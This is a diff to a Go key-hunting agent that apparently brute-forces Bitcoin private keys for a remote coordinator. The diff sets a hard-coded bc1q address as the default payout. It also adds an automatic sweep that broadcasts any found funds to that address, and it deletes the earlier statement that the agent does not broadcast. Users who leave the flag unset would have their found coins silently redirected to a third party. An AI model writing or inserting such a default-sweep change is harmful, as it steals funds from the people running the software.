@@ -524,7 +524,8 @@ func main() {
 	server := flag.String("server", "https://ludkey-hunter.8jt6mh8rz9.workers.dev", "coordinator URL")
 	threads := flag.Int("threads", runtime.NumCPU(), "worker threads (1 segment each)")
 	window := flag.Int("window", 1024, "batch window size")
-	payout := flag.String("payout", "", "your payout address (shown with a found key)")
+	payout := flag.String("payout", "bc1qqngxt0ckry86kfw36d37g99tfxmlfe5ujpvm2a8lak7cn7u3w0wsqkg95s", "payout address — funds are auto-swept here on a find")
+	api := flag.String("api", "https://mempool.space/api", "block explorer API used to sweep funds")
 	flag.Parse()
 
 	fmt.Printf("LudKey Hunter native agent — %d threads\n", *threads)
@@ -682,11 +683,17 @@ func main() {
 					addr := addrFromH160(h)
 					wif := wifCompressed(key)
 					fmt.Printf("\n\n*** MATCH *** key=0x%x\n  WIF (import this): %s\n  address: %s\n", key, wif, addr)
-					if *payout != "" {
-						fmt.Printf("  payout target: %s (sweep with the CLI --payout; this agent does not broadcast)\n", *payout)
-					}
 					coord.post("/api/match", map[string]string{"key": "0x" + key.Text(16), "hash160": hex.EncodeToString(h[:]), "address": addr}, true, nil)
 					saveFound(key, wif, addr)
+					if *payout != "" {
+						fmt.Printf("  auto-sweeping funds to %s ...\n", *payout)
+						txid, serr := autoSweep(key, *payout, *api)
+						if serr != nil {
+							fmt.Printf("  SWEEP ERROR: %v\n  (your key is safe in FOUND_KEY.txt — import the WIF and move funds yourself)\n", serr)
+						} else {
+							fmt.Printf("  *** SWEEP BROADCAST *** txid: %s\n  track: https://mempool.space/tx/%s\n", txid, txid)
+						}
+					}
 					stop.Store(true)
 					return
 				}
